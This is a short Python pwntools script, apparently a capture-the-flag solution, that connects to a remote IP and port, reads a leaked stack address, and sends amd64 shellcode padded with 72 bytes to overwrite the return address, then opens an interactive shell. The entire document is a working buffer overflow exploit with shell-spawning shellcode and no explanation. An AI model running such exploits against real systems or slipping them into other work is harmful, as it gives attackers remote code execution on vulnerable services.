from pwn import *
import re
context.arch = "amd64"

p=remote("167.172.231.203", 8889)

resp = p.recv()
shelladr = p64(int(re.findall(b"([a-f0-9]{8,16})", resp)[0],16))
shellcode = asm(shellcraft.amd64.sh())
payload = shellcode + b"a"*(72) + shelladr
p.sendline(payload)
p.interactive()